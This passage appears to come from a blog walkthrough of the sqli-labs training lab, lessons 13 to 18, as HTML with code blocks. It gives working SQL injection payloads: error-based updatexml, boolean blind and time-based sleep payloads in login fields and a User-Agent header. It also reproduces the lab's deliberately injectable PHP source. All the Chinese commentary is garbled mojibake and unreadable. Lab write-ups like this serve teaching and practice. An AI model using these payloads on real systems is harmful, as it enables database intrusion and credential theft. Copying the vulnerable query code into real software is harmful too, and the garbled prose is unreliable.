class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>åŠ åŒå¼•å·æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&quot;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">the right syntax to use near &#39;bbb&quot; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>çŒœæµ‹åå°sqlè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">&quot;aaa&quot;&quot; and password=&quot;</span>bbb<span class="string">&quot; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>å°è¯•å¯ä»¥æŠ¥é”™æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aaa<span class="string">&quot; and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd=bbb&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/17/sqli-labs-wp/TIM%E6%88%AA%E5%9B%BE20200427172051.png"></p><p>å°è¯•å¸ƒå°”ç›²æ³¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aaa<span class="string">&quot; or substr((select database()),1,1)=&#x27;s&#x27;%23&amp;passwd=bbb&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="å…³é”®ä»£ç -13"><a href="#å…³é”®ä»£ç -13" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">&#x27;&quot;&#x27;</span>.$uname.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$passwd=<span class="string">&#x27;&quot;&#x27;</span>.$passwd.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>æ²¡æœ‰å›æ˜¾ï¼Œè€ƒè™‘ç›²æ³¨å’ŒæŠ¥é”™</p><p>å¸ƒå°”ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&#39; or substr((select database()),1,1)&#x3D;&#39;s&#39;%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ—¶é—´ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;asa&#39; or if((substr((select database()),1,1))&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;passwd&#x3D;dsa&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥ç”¨ä¸äº†äº†ï¼Œå‘ç°<code>print_r(mysql_error());</code>åˆ æ‰äº†ï¼Œè¿™æ ·çš„è¯sqlè¯­å¥é”™è¯¯ä¹Ÿçˆ†ä¸æ¥äº†</p><h3 id="å…³é”®ä»£ç -14"><a href="#å…³é”®ä»£ç -14" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>sqlé”™è¯¯çˆ†ä¸å‡ºæ¥åªèƒ½fuzzï¼Œæœ€ç»ˆå¾—åˆ°</p><p>å¸ƒå°”ç›²æ³¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&quot;) or substr((select database()),1,1)&#x3D;&#39;s&#39;%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>æ—¶é—´ç›²æ³¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&quot;) or if((substr((select database()),1,1))&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="å…³é”®ä»£ç -15"><a href="#å…³é”®ä»£ç -15" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;ï¼Ÿphp</span><br><span class="line">$uname=<span class="string">&#x27;&quot;&#x27;</span>.$uname.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$passwd=<span class="string">&#x27;&quot;&#x27;</span>.$passwd.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>æ¥ç€å°±æ˜¯updateæ³¨å…¥äº†ï¼Œå¯¹äºè¿™ç§æ³¨å…¥ï¼Œæœ€å¥½çš„æ–¹æ³•æ„Ÿè§‰å°±æ˜¯æŠ¥é”™æ³¨å…¥äº†</p><p>çŒœæµ‹åå°sqlè¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="string">&#x27;$password&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç›´æ¥æŠ¥é”™æ³¨å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;sadasda&#39; or updatexml(1,concat(0x3a,(select database())),1)%23&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200513232359.png" style="zoom:67%;"><p>æ³¨æ„è¿™é‡Œunameè¡¨é‡Œå¿…é¡»æœ‰ï¼Œåé¢çš„updatexmlæ‰ä¼šæ‰§è¡Œ</p><p>è¿˜å¯ä»¥æ—¶é—´ç›²æ³¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;sadasda&#39; or if(substr((select database()),1,1)&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="å…³é”®ä»£ç -16"><a href="#å…³é”®ä»£ç -16" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">        $value = stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">    &#123;</span><br><span class="line">        $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">$passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;User Name:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;New Password:&#x27;</span>.$passwd.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">        $row1 = $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        $update=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">        mysql_query($update);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (mysql_error())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>è¿™ä¸ªæ˜¯User-Agent insertæ³¨å…¥</p><p>sqlè¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`security`</span>.<span class="string">`uagents`</span> (<span class="string">`uagent`</span>, <span class="string">`ip_address`</span>, <span class="string">`username`</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;$uagent&#x27;</span>, <span class="string">&#x27;$IP&#x27;</span>, $uname)</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥æ„é€ ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: firefox&#x27; or updatexml(1,concat(0x3a,(select user())),1) or &#x27;</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200513232605.png" style="zoom:80%;"><p>è¿™é‡Œçš„è´¦å·å¯†ç å¿…é¡»æ­£ç¡®</p><p>ä¹Ÿå¯ä»¥æ—¶é—´ç›²æ³¨ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: firefox&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0) or &#x27;</span><br></pre></td></tr></table></figure><h3 id="å…³é”®ä»£ç -17"><a href="#å…³é”®ä»£ç -17" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">    $value = stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">    &#123;</span><br><span class="line">    $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    $value = intval($value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line">$uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span 